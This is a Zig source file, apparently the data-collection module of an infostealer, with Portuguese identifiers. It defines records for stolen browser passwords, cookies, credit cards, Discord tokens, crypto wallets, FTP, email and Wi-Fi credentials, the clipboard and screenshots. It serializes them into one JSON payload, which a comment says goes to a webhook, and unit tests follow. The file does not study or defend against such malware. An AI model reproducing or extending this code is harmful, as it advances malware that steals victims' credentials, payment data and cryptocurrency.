const std = @import("std");

/// Replace invalid UTF-8 bytes with U+FFFD. Decrypted credential blobs can be
/// arbitrary bytes; without this the JSON serializer would emit an invalid
/// document (and the webhook would reject the whole payload).
pub fn sanitizeUtf8(allocator: std.mem.Allocator, s: []const u8) ![]u8 {
    if (std.unicode.utf8ValidateSlice(s)) return allocator.dupe(u8, s);

    var out: std.ArrayList(u8) = .empty;
    defer out.deinit(allocator);
    var i: usize = 0;
    while (i < s.len) {
        const n = std.unicode.utf8ByteSequenceLength(s[i]) catch 0;
        if (n != 0 and i + n <= s.len and std.unicode.utf8ValidateSlice(s[i .. i + n])) {
            try out.appendSlice(allocator, s[i .. i + n]);
            i += n;
        } else {
            try out.appendSlice(allocator, "\u{FFFD}");
            i += 1;
        }
    }
    return out.toOwnedSlice(allocator);
}

pub const Senha = struct {
    url: []const u8 = "",
    usuario: []const u8 = "",
    senha: []const u8 = "",
    navegador: []const u8 = "",
};

pub const Cookie = struct {
    host: []const u8 = "",
    nome: []const u8 = "",
    valor: []const u8 = "",
    navegador: []const u8 = "",
};

pub const Cartao = struct {
    numero: []const u8 = "",
    validade: []const u8 = "",
    titular: []const u8 = "",
    navegador: []const u8 = "",
};

pub const Pagina = struct {
    url: []const u8 = "",
    titulo: []const u8 = "",
    visitas: u32 = 0,
    navegador: []const u8 = "",
};

pub const ArquivoWallet = struct {
    carteira: []const u8 = "",
    caminho: []const u8 = "",
};

pub const CredFTP = struct {
    host: []const u8 = "",
    port: u16 = 21,
    user: []const u8 = "",
    senha: []const u8 = "",
};

pub const CredEmail = struct {
    app: []const u8 = "",
    user: []const u8 = "",
    senha: []const u8 = "",
};

pub const WiFi = struct {
    ssid: []const u8 = "",
    senha: []const u8 = "",
};

pub const ArquivoGrab = struct {
    path: []const u8 = "",
    content: []const u8 = "",
};

pub const ScreenshotInfo = struct {
    path: []const u8 = "",
    width: i32 = 0,
    height: i32 = 0,
};

pub const SistemInfo = struct {
    os: []const u8 = "",
    cpu: []const u8 = "",
    ram_mb: u64 = 0,
    gpu: []const u8 = "",
    hostname: []const u8 = "",
    username: []const u8 = "",
    ip: []const u8 = "",
};

pub const Coleta = struct {
    allocator: std.mem.Allocator,
    sistema: SistemInfo,
    senhas: std.ArrayList(Senha),
    cookies: std.ArrayList(Cookie),
    cartoes: std.ArrayList(Cartao),
    historico: std.ArrayList(Pagina),
    discord_tokens: std.ArrayList([]const u8),
    telegram_arquivos: std.ArrayList([]const u8),
    steam_arquivos: std.ArrayList([]const u8),
    wallets_ext: std.ArrayList(ArquivoWallet),
    wallets_desk: std.ArrayList(ArquivoWallet),
    filezilla: std.ArrayList(CredFTP),
    emails: std.ArrayList(CredEmail),
    wifi: std.ArrayList(WiFi),
    arquivos_grab: std.ArrayList(ArquivoGrab),
    clipboard: []const u8,
    screenshot: ScreenshotInfo,

    pub fn init(allocator: std.mem.Allocator) Coleta {
        return .{
            .allocator = allocator,
            .sistema = .{},
            .senhas = .empty,
            .cookies = .empty,
            .cartoes = .empty,
            .historico = .empty,
            .discord_tokens = .empty,
            .telegram_arquivos = .empty,
            .steam_arquivos = .empty,
            .wallets_ext = .empty,
            .wallets_desk = .empty,
            .filezilla = .empty,
            .emails = .empty,
            .wifi = .empty,
            .arquivos_grab = .empty,
            .clipboard = "",
            .screenshot = .{},
        };
    }

    pub fn deinit(self: *Coleta) void {
        const a = self.allocator;
        self.senhas.deinit(a);
        self.cookies.deinit(a);
        self.cartoes.deinit(a);
        self.historico.deinit(a);
        for (self.discord_tokens.items) |t| a.free(t);
        self.discord_tokens.deinit(a);
        for (self.telegram_arquivos.items) |t| a.free(t);
        self.telegram_arquivos.deinit(a);
        for (self.steam_arquivos.items) |t| a.free(t);
        self.steam_arquivos.deinit(a);
        self.wallets_ext.deinit(a);
        self.wallets_desk.deinit(a);
        self.filezilla.deinit(a);
        self.emails.deinit(a);
        self.wifi.deinit(a);
        self.arquivos_grab.deinit(a);
    }

    pub fn toJson(self: *Coleta) ![]u8 {
        var out: std.Io.Writer.Allocating = .init(self.allocator);
        defer out.deinit();
        var ws: std.json.Stringify = .{ .writer = &out.writer, .options = .{} };

        try ws.beginObject();

        try ws.objectField("sistema");
        try ws.write(self.sistema);

        try ws.objectField("senhas");
        try ws.write(self.senhas.items);

        try ws.objectField("cookies");
        try ws.write(self.cookies.items);

        try ws.objectField("cartoes");
        try ws.write(self.cartoes.items);

        try ws.objectField("historico");
        try ws.write(self.historico.items);

        try ws.objectField("discord_tokens");
        try ws.write(self.discord_tokens.items);

        try ws.objectField("telegram_arquivos");
        try ws.write(self.telegram_arquivos.items);

        try ws.objectField("steam_arquivos");
        try ws.write(self.steam_arquivos.items);

        try ws.objectField("wallets_ext");
        try ws.write(self.wallets_ext.items);

        try ws.objectField("wallets_desk");
        try ws.write(self.wallets_desk.items);

        try ws.objectField("filezilla");
        try ws.write(self.filezilla.items);

        try ws.objectField("emails");
        try ws.write(self.emails.items);

        try ws.objectField("wifi");
        try ws.write(self.wifi.items);

        try ws.objectField("arquivos_grab");
        // Custom serialization: only serialize path, skip binary content
        // to avoid corrupting JSON with invalid UTF-8 from .db/.dat files
        try ws.beginArray();
        for (self.arquivos_grab.items) |item| {
            try ws.beginObject();
            try ws.objectField("path");
            try ws.write(item.path);
            try ws.endObject();
        }
        try ws.endArray();

        try ws.objectField("clipboard");
        try ws.write(self.clipboard);

        try ws.objectField("screenshot");
        try ws.write(self.screenshot);

        try ws.endObject();

        return self.allocator.dupe(u8, out.written());
    }
};

// ============================================================
//  Tests (run on the host: zig test src/coleta.zig)
// ============================================================

test "sanitizeUtf8 passes valid text through untouched" {
    const out = try sanitizeUtf8(std.testing.allocator, "café → 🦀");
    defer std.testing.allocator.free(out);
    try std.testing.expectEqualStrings("café → 🦀", out);
}

test "sanitizeUtf8 replaces invalid bytes and stays valid" {
    const input = [_]u8{ 0xFF, 'a', 0xC3, 0xA9, 0x80 };
    const out = try sanitizeUtf8(std.testing.allocator, &input);
    defer std.testing.allocator.free(out);
    try std.testing.expect(std.unicode.utf8ValidateSlice(out));
    try std.testing.expect(std.mem.indexOf(u8, out, "é") != null);
}

test "toJson produces parseable JSON for binary credential data" {
    var col = Coleta.init(std.testing.allocator);
    defer col.deinit();

    const secret = try sanitizeUtf8(std.testing.allocator, &[_]u8{ 0xFF, 0xFE, 'x' });
    defer std.testing.allocator.free(secret);
    try col.senhas.append(std.testing.allocator, .{
        .url = "https://example.com",
        .usuario = "user",
        .senha = secret,
        .navegador = "Chrome",
    });

    const doc = try col.toJson();
    defer std.testing.allocator.free(doc);

    const parsed = try std.json.parseFromSlice(std.json.Value, std.testing.allocator, doc, .{});
    defer parsed.deinit();
    try std.testing.expect(parsed.value.object.get("senhas").?.array.items.len == 1);
}
